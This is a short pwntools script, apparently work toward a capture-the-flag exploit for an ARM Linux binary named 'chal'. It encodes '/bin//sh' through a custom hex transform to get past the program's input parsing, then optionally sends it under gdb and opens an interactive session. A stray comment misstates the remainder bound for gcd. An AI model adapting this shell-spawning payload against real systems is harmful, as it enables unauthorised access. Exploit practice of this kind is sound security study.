#!/bin/python3
from pwn import *
EXPLOIT = 0
# if a = b * q + r and b is not 0
# then gcd(a,b) = gcd(b,r) where is q is an integer, and r is an integer
# between 0 and 1
context.update(arch='arm',os='linux',bits='32')
context.terminal = ['tmux', 'new-window']

def parse_hex(payload):
    i = 0
    j = 0
    dst = []
    while j < len(payload) / 2:
        dst.append(
            (payload[i] % 32 + 9) % 25 * 16 + (payload[i + 1] % 32 + 9) % 25
        )
        i += 2
        j += 1
    return dst

def pre_parse(input):
    output = b''
    for c in input:
        for x in range(25):
            if (x + 9) % 25 == int(c.encode(),16):
                output += p8(x)
    return output


sh = enhex(b'/bin//sh')
payload = pre_parse(sh)
print(sh)
print(payload,len(payload))

print(parse_hex(payload))

if EXPLOIT:
    e = ELF('chal')
    io = gdb.debug('./chal', '''
    break main
    b*0x00010ad0
    ''')
    io.recv()
    io.sendline(payload)
    io.recvall()
    io.interactive()
